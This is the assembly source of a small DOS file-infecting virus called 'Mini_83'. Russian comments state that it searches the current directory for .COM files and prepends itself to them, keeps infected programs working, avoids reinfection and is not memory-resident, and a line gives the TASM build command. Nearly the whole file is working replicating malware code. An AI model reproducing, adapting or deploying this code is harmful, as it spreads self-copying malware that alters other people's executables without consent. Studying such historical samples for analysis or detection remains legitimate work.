; Mini_83 (c) CrkV

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ оставляет программы работоспособными
;■ не заражает повторно уже инфицированные программы
;■ портит DTA
;■ не резидентный

;■ портит начальные значения регистров
;■ изменяет местоположение программы относительно PSP

;use tasm mini_83 /m2

Model Tiny
.code
org 100h
start:
        Inc     Dh                      ;Xchg Dx,Ax (-1byte)
        Mov     Es,Dx
        Inc     Cx                      ;Cx=0FFh (Xchg Cx,Si - 1byte)
        Sub     Di,Di
        Sub     Si,Si
        Repe    MovSB
        Mov     Si,VirLength+100h       ;Xchg Si,Ax (-1byte)
        Push    Es Di Si Cs             ;Push Si
        Pop     Cx
        Repe    MovSB
        Pop     Si                      ;Pop Si (+2bytes)
        Mov     Dx,(VirLength-6)+100h
        Mov     Ah,4Eh
@0:
        Int     21h
        Jnc     @1
        RetF
@1:
        Mov     Ax,3D02h
        Mov     Dx,9Eh
        Int     21h
        Xchg    Bx,Ax
        Mov     Ah,3Fh
        Mov     Dx,Si                   ;Mov Dx,VirLenght (-1 byte)
        Push    Sp
        Pop     Cx
        Int     21h
        Cmp     Byte Ptr Ds:[Si],0FEh   ;(-2 bytes)
        Je      @2
        Add     Ax,Virlength
        Push    Ax
        Sub     Cx,Cx
        Mul     Cx
        Mov     Ah,42h
        Int     21h
        Pop     Cx
        Mov     Ah,40h
        Pop     Dx
        Push    Dx
        Int     21h
@2:     Mov     Ah,4Fh
        Jmp     Short @0

FileName db '*.com', 0h
VirLength equ $-start
        Ret
end start
